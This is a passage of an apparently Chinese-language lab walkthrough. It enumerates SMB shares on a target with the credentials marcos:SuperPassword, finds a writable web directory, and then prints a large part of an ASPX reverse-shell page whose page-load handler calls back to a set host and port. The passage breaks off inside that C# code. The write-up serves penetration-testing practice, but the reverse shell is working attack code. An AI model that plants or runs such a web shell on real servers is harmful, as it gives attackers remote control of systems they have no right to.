class="line"></span><br><span class="line">PS C:\&gt; net use \\127.0.0.1\WEB /user:marcos SuperPassword</span><br><span class="line">Se ha completado el comando correctamente.</span><br><span class="line"></span><br><span class="line">PS C:\&gt; <span class="built_in">dir</span> \\127.0.0.1\WEB</span><br><span class="line"></span><br><span class="line">    Directorio: \\127.0.0.1\WEB</span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">d-----        10/8/2023   9:46 PM                aspnet_client</span><br><span class="line">-a----        9/26/2023   6:46 PM            703 iisstart.htm</span><br><span class="line">-a----        10/8/2023  10:46 PM            158 test.php</span><br><span class="line"></span><br><span class="line">PS C:\&gt; <span class="built_in">rm</span> \\127.0.0.1\WEB\*.php</span><br><span class="line"></span><br><span class="line">PS C:\&gt; <span class="built_in">dir</span> \\127.0.0.1\WEB</span><br><span class="line"></span><br><span class="line">    Directorio: \\127.0.0.1\WEB</span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">d-----        10/8/2023   9:46 PM                aspnet_client</span><br><span class="line">-a----        9/26/2023   6:46 PM            703 iisstart.htm</span><br><span class="line"></span><br><span class="line">PS C:\&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>尝试该用户发下密码也过期了</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># smbmap  -H 10.0.3.30 -u marcos -p SuperPassword</span></span><br><span class="line"></span><br><span class="line">    ________  ___      ___  _______   ___      ___       __         _______</span><br><span class="line">   /<span class="string">&quot;       )|&quot;</span>  \    /<span class="string">&quot;  ||   _  &quot;</span>\ |<span class="string">&quot;  \    /&quot;</span>  |     /<span class="string">&quot;&quot;</span>\       |   __ <span class="string">&quot;\</span></span><br><span class="line"><span class="string">  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)</span></span><br><span class="line"><span class="string">   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /&#x27; /\  \     |:  ____/</span></span><br><span class="line"><span class="string">    __/  \   |: \.        |(|  _  \  |: \.        |  //  __&#x27;  \    (|  /</span></span><br><span class="line"><span class="string">   /&quot;</span> \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \</span><br><span class="line">  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)</span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">SMBMap - Samba Share Enumerator v1.10.4 | Shawn Evans - ShawnDEvans@gmail.com&lt;mailto:ShawnDEvans@gmail.com&gt;</span><br><span class="line">                     https://github.com/ShawnDEvans/smbmap</span><br><span class="line"></span><br><span class="line">[*] Detected 1 hosts serving SMB                                                                                                  </span><br><span class="line">[*] Established 0 SMB connections(s) and 0 authenticated session(s)                                                      </span><br><span class="line">[*] Closed 0 connections                                                                                                     </span><br><span class="line">                                                                                                                                                                                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># smbclient -U marcos -L 10.0.3.30               </span></span><br><span class="line">Password <span class="keyword">for</span> [WORKGROUP\marcos]:</span><br><span class="line">session setup failed: NT_STATUS_PASSWORD_EXPIRED</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>进靶机修改后再次测试</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># smbmap  -H 10.0.3.30 -u marcos -p SuperPassword</span></span><br><span class="line"></span><br><span class="line">    ________  ___      ___  _______   ___      ___       __         _______</span><br><span class="line">   /<span class="string">&quot;       )|&quot;</span>  \    /<span class="string">&quot;  ||   _  &quot;</span>\ |<span class="string">&quot;  \    /&quot;</span>  |     /<span class="string">&quot;&quot;</span>\       |   __ <span class="string">&quot;\</span></span><br><span class="line"><span class="string">  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)</span></span><br><span class="line"><span class="string">   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /&#x27; /\  \     |:  ____/</span></span><br><span class="line"><span class="string">    __/  \   |: \.        |(|  _  \  |: \.        |  //  __&#x27;  \    (|  /</span></span><br><span class="line"><span class="string">   /&quot;</span> \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \</span><br><span class="line">  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)</span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">SMBMap - Samba Share Enumerator v1.10.4 | Shawn Evans - ShawnDEvans@gmail.com&lt;mailto:ShawnDEvans@gmail.com&gt;</span><br><span class="line">                     https://github.com/ShawnDEvans/smbmap</span><br><span class="line"></span><br><span class="line">[*] Detected 1 hosts serving SMB                                                                                                  </span><br><span class="line">[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      </span><br><span class="line">                                                                                                                             </span><br><span class="line">[+] IP: 10.0.3.30:445   Name: 10.0.3.30                 Status: Authenticated</span><br><span class="line">        Disk                                                    Permissions     Comment</span><br><span class="line">        ----                                                    -----------     -------</span><br><span class="line">        ADMIN$                                                  NO ACCESS       Admin remota</span><br><span class="line">        C$                                                      NO ACCESS       Recurso predeterminado</span><br><span class="line">        IPC$                                                    READ ONLY       IPC remota</span><br><span class="line">        LOGS                                                    READ ONLY</span><br><span class="line">        WEB                                                     READ, WRITE</span><br><span class="line">[*] Closed 1 connections                                                                                                     </span><br><span class="line">                                                                                                                                                                                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># smbmap  -H 10.0.3.30 -u marcos -p SuperPassword -r &#x27;WEB&#x27;</span></span><br><span class="line"></span><br><span class="line">    ________  ___      ___  _______   ___      ___       __         _______</span><br><span class="line">   /<span class="string">&quot;       )|&quot;</span>  \    /<span class="string">&quot;  ||   _  &quot;</span>\ |<span class="string">&quot;  \    /&quot;</span>  |     /<span class="string">&quot;&quot;</span>\       |   __ <span class="string">&quot;\</span></span><br><span class="line"><span class="string">  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)</span></span><br><span class="line"><span class="string">   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /&#x27; /\  \     |:  ____/</span></span><br><span class="line"><span class="string">    __/  \   |: \.        |(|  _  \  |: \.        |  //  __&#x27;  \    (|  /</span></span><br><span class="line"><span class="string">   /&quot;</span> \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \</span><br><span class="line">  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)</span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">SMBMap - Samba Share Enumerator v1.10.4 | Shawn Evans - ShawnDEvans@gmail.com&lt;mailto:ShawnDEvans@gmail.com&gt;</span><br><span class="line">                     https://github.com/ShawnDEvans/smbmap</span><br><span class="line"></span><br><span class="line">[*] Detected 1 hosts serving SMB                                                                                                  </span><br><span class="line">[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      </span><br><span class="line">                                                                                                                             </span><br><span class="line">[+] IP: 10.0.3.30:445   Name: 10.0.3.30                 Status: Authenticated</span><br><span class="line">        Disk                                                    Permissions     Comment</span><br><span class="line">        ----                                                    -----------     -------</span><br><span class="line">        ADMIN$                                                  NO ACCESS       Admin remota</span><br><span class="line">        C$                                                      NO ACCESS       Recurso predeterminado</span><br><span class="line">        IPC$                                                    READ ONLY       IPC remota</span><br><span class="line">        LOGS                                                    READ ONLY</span><br><span class="line">        WEB                                                     READ, WRITE</span><br><span class="line">        ./WEB</span><br><span class="line">        dr--r--r--                0 Mon Oct 28 05:02:47 2024    .</span><br><span class="line">        dr--r--r--                0 Mon Oct 28 05:02:47 2024    ..</span><br><span class="line">        dr--r--r--                0 Sun Oct  8 17:22:20 2023    03-comming-soon</span><br><span class="line">        dr--r--r--                0 Sun Oct  8 16:00:33 2023    aspnet_client</span><br><span class="line">        dr--r--r--                0 Sun Oct  8 17:18:47 2023    common-js</span><br><span class="line">        dr--r--r--                0 Sun Oct  8 17:18:47 2023    fonts</span><br><span class="line">        dr--r--r--                0 Sun Oct  8 17:18:47 2023    images</span><br><span class="line">        fr--r--r--             1481 Sun Oct  8 17:26:47 2023    index.html</span><br><span class="line">[*] Closed 1 connections </span><br></pre></td></tr></table></figure>
<p>WEB 目录有写权限，测试发现可上传利用 aspx 脚本</p>
<p>test.aspx</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language=&quot;C#&quot; %&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;ASP.NET Test Page&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;ASP.NET Test Successful!&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;Current time: &lt;%= DateTime.Now.ToString() %&gt;&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>Linux 下 SMB 的 GUI 连接【<code>marcos:SuperPassword</code>】</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xdg-open smb://10.0.3.30/</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202410281444511.jpg" /></p>
<h2 id="渗透攻击">2. 渗透攻击</h2>
<h3 id="获取-shell">2.1. 获取 Shell</h3>
<p>利用 aspx 反弹 Shell</p>
<ul>
<li><a
target="_blank" rel="noopener" href="https://raw.githubusercontent.com/borjmz/aspx-reverse-shell/master/shell.aspx">reverse-shell.aspx</a></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language=&quot;C#&quot; %&gt;</span><br><span class="line">&lt;%@ Import Namespace=&quot;System.Runtime.InteropServices&quot; %&gt;</span><br><span class="line">&lt;%@ Import Namespace=&quot;System.Net&quot; %&gt;</span><br><span class="line">&lt;%@ Import Namespace=&quot;System.Net.Sockets&quot; %&gt;</span><br><span class="line">&lt;%@ Import Namespace=&quot;System.Security.Principal&quot; %&gt;</span><br><span class="line">&lt;%@ Import Namespace=&quot;System.Data.SqlClient&quot; %&gt;</span><br><span class="line">&lt;script runat=&quot;server&quot;&gt;</span><br><span class="line">//Original shell post: https://www.darknet.org.uk/2014/12/insomniashell-asp-net-reverse-shell-bind-shell/</span><br><span class="line">//Download link: https://www.darknet.org.uk/content/files/InsomniaShell.zip</span><br><span class="line">    </span><br><span class="line">	protected void Page_Load(object sender, EventArgs e)</span><br><span class="line">    &#123;</span><br><span class="line">	    String host = &quot;127.0.0.1&quot;; //CHANGE THIS</span><br><span class="line">            int port = 1234; ////CHANGE THIS</span><br><span class="line">                </span><br><span class="line">        CallbackShell(host, port);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    [StructLayout(LayoutKind.Sequential)]</span><br><span class="line">    public struct STARTUPINFO</span><br><span class="line">    &#123;</span><br><span class="line">        public int cb;</span><br><span class="line">        public String lpReserved;</span><br><span class="line">        public String lpDesktop;</span><br><span class="line">        public String lpTitle;</span><br><span class="line">        public uint dwX;</span><br><span class="line">        public uint dwY;</span><br><span class="line">        public uint dwXSize;</span><br><span class="line">        public uint dwYSize;</span><br><span class="line">        public uint dwXCountChars;</span><br><span class="line">        public uint dwYCountChars;</span><br><span class="line">        public uint dwFillAttribute;</span><br><span class="line">        public uint dwFlags;</span><br><span class="line">        public short wShowWindow;</span><br><span class="line">        public short cbReserved2;</span><br><span class="line">        public IntPtr lpReserved2;</span><br><span class="line">        public IntPtr hStdInput;</span><br><span class="line">        public IntPtr hStdOutput;</span><br><span class="line">        public IntPtr hStdError;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    [StructLayout(LayoutKind.Sequential)]</span><br><span class="line">    public struct PROCESS_INFORMATION</span><br><span class="line">    &#123;</span><br><span class="line">        public IntPtr hProcess;</span><br><span class="line">        public IntPtr hThread;</span><br><span class="line">        public uint dwProcessId;</span><br><span class="line">        public uint dwThreadId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    [StructLayout(LayoutKind.Sequential)]</span><br><span class="line">    public struct SECURITY_ATTRIBUTES</span><br><span class="line">    &#123;</span><br><span class="line">        public int Length;</span><br><span class="line">        public IntPtr lpSecurityDescriptor;</span><br><span class="line">        public bool bInheritHandle;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    [DllImport(&quot;kernel32.dll&quot;)]</span><br><span class="line">    static extern bool CreateProcess(string lpApplicationName,</span><br><span class="line">       string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes,</span><br><span class="line">       ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles,</span><br><span class="line">       uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,</span><br><span class="line">       [In] ref STARTUPINFO lpStartupInfo,</span><br><span class="line">       out PROCESS_INFORMATION lpProcessInformation);</span><br><span class="line"></span><br><span class="line">    public static uint INFINITE = 0xFFFFFFFF;</span><br><span class="line">    </span><br><span class="line">    [DllImport(&quot;kernel32&quot;, SetLastError = true, ExactSpelling = true)]</span><br><span class="line">    internal static extern Int32 WaitForSingleObject(IntPtr handle, Int32 milliseconds);</span><br><span class="line"></span><br><span class="line">    internal struct sockaddr_in</span><br><span class="line">    &#123;</span><br><span class="line">        public short sin_family;</span><br><span class="line">        public short sin_port;</span><br><span class="line">        public int sin_addr;</span><br><span class="line">        public long sin_zero;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    [DllImport(&quot;kernel32.dll&quot;)]</span><br><span class="line">    static extern IntPtr GetStdHandle(int nStdHandle);</span><br><span class="line"></span><br><span class="line">    [DllImport(&quot;kernel32.dll&quot;)]</span><br><span class="line">    static extern bool SetStdHandle(int nStdHandle, IntPtr hHandle);</span><br><span class="line"></span><br><span class="line">    public const int STD_INPUT_HANDLE = -10;</span><br><span class="line">    public const int STD_OUTPUT_HANDLE = -11;</span><br><span class="line">    public const int STD_ERROR_HANDLE = -12;</span><br><span class="line">    </span><br><span class="line">    [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">    static extern bool AllocConsole();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    [DllImport(&quot;WS2_32.dll&quot;, CharSet = CharSet.Ansi, SetLastError = true)]</span><br><span class="line">    internal static extern IntPtr WSASocket([In] AddressFamily addressFamily,</span><br><span class="line">                                            [In] SocketType socketType,</span><br><span class="line">                                            [In] ProtocolType protocolType,</span><br><span class="line">                                            [In] IntPtr protocolInfo, </span><br><span class="line">                                            [In] uint group,</span><br><span class="line">                                            [In] int flags</span><br><span class="line">                                            );</span><br><span class="line"></span><br><span class="line">    [DllImport(&quot;WS2_32.dll&quot;, CharSet = CharSet.Ansi, SetLastError = true)]</span><br><span class="line">    internal static extern int inet_addr([In] string cp);</span><br><span class="line">    [DllImport(&quot;ws2_32.dll&quot;)]</span><br><span class="line">    private static extern string inet_ntoa(uint ip);</span><br><span class="line"></span><br><span class="line">    [DllImport(&quot;ws2_32.dll&quot;)]</span><br><span class="line">    private static extern uint htonl(uint ip);</span><br><span class="line">    </span><br><span class="line">    [DllImport(&quot;ws2_32.dll&quot;)]</span><br><span class="line">    private static extern uint ntohl(uint ip);</span><br><span class="line">    </span><br><span class="line">    [DllImport(&quot;ws2_32.dll&quot;)]</span><br><span class="line">    private static extern ushort htons(ushort ip);</span><br><span class="line">    </span><br><span class="line">    [DllImport(&quot;ws2_32.dll&quot;)]</span><br><span class="line">    private static extern ushort ntohs(ushort ip);   </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">   [DllImport(&quot;WS2_32.dll&quot;, CharSet=CharSet.Ansi, SetLastError=true)]</span><br><span class="line">   internal static extern int connect([In] IntPtr socketHandle,[In] ref sockaddr_in socketAddress,[In] int socketAddressSize);</span><br><span class="line"></span><br><span class="line">    [DllImport(&quot;WS2_32.dll&quot;, CharSet = CharSet.Ansi, SetLastError = true)]</span><br><span class="line">   internal static extern int send(</span><br><span class="line">                                [In] IntPtr socketHandle,</span><br><span class="line">                                [In] byte[] pinnedBuffer,</span><br><span class="line">                                [In] int len,</span><br><span class="line">                                [In] SocketFlags socketFlags</span><br><span class="line">                                );</span><br><span class="line"></span><br><span class="line">    [DllImport(&quot;WS2_32.dll&quot;, CharSet = CharSet.Ansi, SetLastError = true)]</span><br><span class="line">   internal static extern int recv(</span><br><span class="line">                                [In] IntPtr socketHandle,</span><br><span class="line">                                [In] IntPtr pinnedBuffer,</span><br><span class="line">                                [In] int len,</span><br><span class="line">                                [In] SocketFlags socketFlags</span><br><span class="line">                                );</span><br><span class="line"></span><br><span class="line">    [DllImport(&quot;WS2_32.dll&quot;, CharSet = CharSet.Ansi, SetLastError = true)]</span><br><span class="line">   internal static extern int closesocket(</span><br><span class="line">                                       [In] IntPtr socketHandle</span><br><span class="line">                                       );</span><br><span class="line"></span><br><span class="line">    [DllImport(&quot;WS2_32.dll&quot;, CharSet = CharSet.Ansi, SetLastError = true)]</span><br><span class="line">   internal static extern IntPtr accept(</span><br><span class="line">                                  [In] IntPtr socketHandle,</span><br><span class="line">                                  [In, Out] ref sockaddr_in socketAddress,</span><br><span class="line">                                  [In, Out] ref int socketAddressSize</span><br><span class="line">                                  );</span><br><span class="line"></span><br><span class="line">    [DllImport(&quot;WS2_32.dll&quot;, CharSet = CharSet.Ansi, SetLastError = true)]</span><br><span class="line">   internal static extern int listen(</span><br><span class="line">                                  [In] IntPtr socketHandle,</span><br><span class="line">                                  [In] int backlog</span><br><span class="line">                                  );</span><br><span class="line"></span><br><span class="line">    [DllImport(&quot;WS2_32.dll&quot;, CharSet = CharSet.Ansi, SetLastError = true)]</span><br><span class="line">   internal static extern int bind(</span><br><span class="line">                                [In] IntPtr socketHandle,</span><br><span class="line">                                [In] ref sockaddr_in  